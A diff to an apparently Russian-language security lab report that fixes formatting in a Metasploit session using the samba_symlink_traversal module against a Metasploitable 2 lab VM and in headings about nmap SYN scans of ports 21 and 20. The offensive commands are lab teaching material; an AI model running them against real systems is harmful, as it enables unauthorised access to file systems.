@@ -516,7 +516,8 @@ View the full module info with the info, or info -d command.
 
 msf6 auxiliary(admin/smb/samba_symlink_traversal) > set RHOSTS 192.168.56.109
 RHOSTS => 192.168.56.109
-msf6 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmpSMBSHARE => tmp
+msf6 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
+SMBSHARE => tmp
 msf6 auxiliary(admin/smb/samba_symlink_traversal) > show options
 Module options (auxiliary/admin/smb/samba_symlink_traversal):
 
@@ -588,7 +589,7 @@ smb: \rootfs\etc\> exit
 это используемый по умолчанию и наиболее популярный тип сканирования. На то есть несколько причин. Он может быть быстро запущен, он способен сканировать тысячи портов в секунду при быстром соединении, его работе не препятствуют ограничивающие бранмауэры. Этот тип сканирования относительно ненавящив и незаметен, т.к. при таком сканировании TCP соединение никогда не устанавливается до конца. Он работает с любым TCP стеком, не завися от каки-либо особенностей специфичной платформы, как это происходит при сканированиях типа FIN/NULL/Xmas, Maimon и idle сканировании. Он также предоставляет ясную и достоверную дифференциацию между состояниями открыт, закрыт и фильтруется.
 
 
-*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на открытом 21 порту в режиме SYN***
+** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на открытом 21 порту в режиме SYN **
 
 ```bash
 ┌──(kali㉿makhota-kali)-[~]
@@ -612,7 +613,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
 2) vm `Metasploitable 2` отправляет пакет пакет TCP с флагом ACK, подтверждая соединение, и напраяляет обратно на машину `kali` запрос соединения SYN. `nmap` на основании этого ответа делает вывод о том, что порт 21 открыт.
 3) vm `kali` отправляет пакет TCP с флагом RST, прерывая соединение.
 
-*** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на закрытом 20 порту в режиме SYN***
+** Сканируем `nmap` машину `Metasploitable 2` на ip 192.168.56.110 на закрытом 20 порту в режиме SYN **
 
 ```bash
 ┌──(kali㉿makhota-kali)-[~]
